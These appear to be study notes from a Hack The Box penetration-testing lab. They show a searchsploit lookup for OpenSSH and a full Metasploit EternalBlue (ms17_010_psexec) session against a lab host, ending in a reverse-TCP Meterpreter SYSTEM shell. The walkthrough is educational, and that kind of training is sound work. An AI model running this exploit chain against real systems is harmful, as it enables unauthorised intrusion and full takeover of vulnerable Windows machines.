After we identify the service running on ports using Nmap scan, the sfirst step is to look if any of the servies have any public exploits, which can be found for web application and other applications running on open ports like SSH or ftp. 

---
Finding public exploits

Many tools can help us for the various application and services we may encounter during the enumeration phase, one way is to google for the application name with exploit to see if we get any results. 
Ex) windows 7 smb exploits
A well known tool for this purpose if searchsploit, which we can use to search for public vulnerabilities or exploits for any application. 

```
kwc0827@htb[/htb]$ searchsploit openssh 7.2

----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration         
```
We can also utilize online exploit databases to search for vulnerabilities. 

----
## Metasploit Primer

The MSF is an excellent tool for pentesters(침투테스터). It contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets. Masf has many other features like
- Running reconnaissance (정찰) scripts to enumerate remote hosts and compromised targets.
- Verification scripts to test the existence of a vulnerability without actually compromising the target
- Meterpreter which is a great tool to connect to shells and run commands on the compromised targets
- Many post exploitation and pivoting tool
Metasploit can be used with the msfconsole command.
Once we have metasploit running, we can search for our target with the search exploit command. For example, we can search for the SMB vulnerability we identified previosuly.

```
msf6 > search exploit eternalblue

Matching Modules
===================

# name        Disclosure Date Rank  Check  Description
  ----        ---------- --- ----- ------ -------------
  <SNIP>
  EternalBlue SMB Remote Windows Kernel Pool Corruption for WIN8+
   4      exploit/windows/smb/ms17_010_psexec  2017-03-14 normal Yes MS17-010
```

We found one exploit for this service. We can use it by copying the full name of it and using USE to use it.

```
msf6 > use exploit/windows/smb/ms17_010_psexec

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```
Before we can run the exploit, we need to configure its options. To view the options available to configure, we can use the show options command:

```
Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as

...SNIP...
```
Any options with required set to yes needs to be set for the exploit to work. In this case, we only have two options to set: rhosts, which means the ip of our target (this can be one IP, multiple IPs, or a file containing a list of Ips). The second option Lhost, represents the IP of our attack host. In the following example, lhost is being set to the IP associated with our tun 0 interface. We can set them with the set command.

```
msf6 explot(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```
Once we have both options set, we can start the exploitation. However, before we run the script, we can run a check to ensure the server is vulnerable. 

```
msf6 exploit(windows/smb/ms17_010_pswxec) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
```
The server is indeed vulnerable. Note that not every exploit the Metasploit Framework supports check functions. Finally, we can use the run or exploit command to run the exploit. 

```
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.10.10.40:445 - Built a write-what-where primitive...
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.40:445 - Selecting PowerShell target
[*] 10.10.10.40:445 - Executing the payload...
[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49159) at 2020-12-27 01:13:28 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 39640 created.
Channel 0 created.
Windows 7 Professional 7601 Service Pack 1
(C) Copyright 1985-2009 Microsoft Corp.

C:\WINDOWS\system32>whoami
NT AUTHORITY\SYSTEM
```
As we can see, we have been able to gain admin access to the box and used the shell command to drop us into an interactive shell. These are basic examples of using Metasploit to exploit a vulnerability on a remote server. 